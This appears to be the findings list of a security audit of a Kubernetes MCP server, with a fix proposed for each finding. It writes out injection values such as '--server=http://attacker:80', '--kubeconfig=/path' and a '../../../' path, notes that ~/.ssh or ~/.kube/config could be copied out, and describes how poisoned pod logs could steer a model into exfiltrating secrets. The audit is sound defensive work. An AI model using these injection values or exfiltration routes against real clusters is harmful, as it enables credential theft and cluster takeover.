message: Tool input reaches a dangerous call: a program is started with arguments taken from tool input.
fix: See M006.
reason: No positional value reaches kubectl apply: filename and namespace are always the value of -f / -n, so they cannot become flags (execFileSync, no shell). The real issue with filename (any local path or URL) is reported separately as M006.

message: Tool input reaches a dangerous call: a program is started with arguments taken from tool input.
fix: Validate resourceType/name/namespace against the Kubernetes name pattern ^[a-z0-9]([-a-z0-9.]*[a-z0-9])?$ (reject anything starting with '-'), and put '--' before positional values.
reason: kubectl_delete resourceType and name is pushed into the kubectl argument list as a positional value with no validation and no '--' separator; the input is never checked against the JSON schema at runtime. An injected value such as '--context=prod-cluster', '--server=http://attacker:80' or '--kubeconfig=/path' is parsed by kubectl as a global flag, so the tool acts on another cluster or sends cluster credentials elsewhere. execFileSync means no shell, so this is flag injection, not command injection.

message: Tool input reaches a dangerous call: a file is written / deleted / moved at a path taken from tool input.
fix: Optional: write into fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-k8s-')).
reason: The written path is built only from os.tmpdir(), a constant prefix and Date.now(); the tool input controls the file content, not the path, so there is no traversal. (Hardening: use fs.mkdtempSync for an unpredictable name.)

message: Tool input reaches a dangerous call: a program is started with arguments taken from tool input.
fix: Disable kubectl_generic by default; if kept, allowlist subcommands (no cp, exec, proxy, port-forward, plugin, config) and flags (no --kubeconfig, --server, --token, --as, --context), and require human approval.

evidence.quote: "Execute any kubectl command with the provided arguments and flags",

reason: By design this tool runs any kubectl subcommand with any flags and arguments chosen by the model, with no allowlist or approval. Besides deleting anything in the cluster, `kubectl cp` reads and writes arbitrary files on the host running the server (e.g. copy ~/.ssh or ~/.kube/config into a pod, or overwrite host files from a pod), and `--kubeconfig`/`--server` flags redirect credentials. It is also still callable when ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS hides it (see M002).

fix: None needed.
reason: pod comes from the cluster's own `get pods` output (Kubernetes names cannot start with '-'), and container is always the value of -c; no tool input becomes a flag here.

title: exec_in_pod runs any shell command in any pod, with an attacker-chosen shell, and is never treated as destructive
reason: Any tool call gives command execution inside any pod in any namespace the kubeconfig can reach (reading mounted service-account tokens and secrets, or changing workloads). There is no approval step, and exec_in_pod is not in destructiveTools, so even the non-destructive mode keeps it listed.
fix: Add exec_in_pod to destructiveTools, require human approval per call, and optionally restrict namespaces/pods via an operator allowlist.

title: Non-destructive mode only hides tools from tools/list; tools/call still runs them
reason: ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS filters the ListTools response but the CallTool handler never checks it, so a client sending tools/call for kubectl_delete, kubectl_generic or uninstall_helm_chart still deletes resources. The destructive list also omits exec_in_pod, kubectl_apply/create/patch/scale/rollout and helm install/upgrade.
fix: In the CallTool handler, reject any tool whose name is in destructiveTools when nonDestructiveTools is true, and add every state-changing tool to that list.

title: port_forward builds a command string and splits it on spaces
reason: Any space in namespace, resourceType or resourceName adds new kubectl arguments; e.g. namespace 'default --address 0.0.0.0' makes the forwarded cluster port listen on every network interface, and '--context=...' / '--kubeconfig=...' work too. No shell, so flag injection only.
fix: Build the args array directly: spawn('kubectl', ['port-forward', '-n', ns, `${type}/${name}`, `${local}:${target}`]) after validating names with the Kubernetes name regex and ports as integers 1-65535.

title: Helm values file is written to a path built from the release name
reason: name such as '../../../home/user/project/prod' writes attacker YAML to any directory the server can write, as long as the file ends in '-values.yaml', and then deletes it in the finally block, so existing *-values.yaml files anywhere can be overwritten and removed.
fix: Write values to fs.mkdtempSync(path.join(os.tmpdir(),'helm-')) + '/values.yaml' and validate name with the Helm release-name regex ^[a-z0-9]([-a-z0-9]*[a-z0-9])?$.

title: Helm release name / chart passed positionally without validation
reason: name, chart and the repo name derived from chart are positional helm arguments with no '--' and no validation, so values like '--kube-context=prod' or '--kubeconfig=/path' become helm flags; repo is any URL the model chooses, so an attacker-controlled chart is installed into the cluster with no approval.
fix: Validate name/chart with strict regexes (no leading '-'), insert '--' before positionals, allowlist chart repositories, and require approval for install/upgrade.

title: filename / patchFile let kubectl read any local path or URL
reason: kubectl -f accepts local paths and http(s) URLs, so the model can make the server fetch internal URLs or apply/delete whatever manifests exist anywhere on the host disk; fragments of the read data can come back in error messages.
fix: Drop filename/patchFile (manifest/patchData already cover the use case) or restrict them to files under an operator-configured directory (realpath + containment check) and reject URLs.

title: Pod logs/exec output reach the model next to secrets and network-capable tools
reason: Logs, describe output and exec output contain text written by applications and their users (untrusted) and are returned raw to the model; the same server can read Secrets (kubectl_get secrets -o yaml) and send data out (exec_in_pod curl, helm repo add with any URL, port_forward), with no approval in between, so an injected log line can drive secret exfiltration.
fix: Mark tool output as untrusted data, require approval for exec_in_pod/kubectl_generic/helm, and deny secrets access in the RBAC role used by the server.

title: Opt-in SSE transport has no authentication or Origin/Host check
reason: When enabled, anyone who reaches the port (or a web page via DNS rebinding, since Host/Origin are not checked) gets every tool, including exec_in_pod. It is opt-in and labelled unsafe; whether it is enabled and on which HOST depends on deployment.
fix: Add bearer-token auth and Host/Origin allowlisting, or keep SSE disabled.
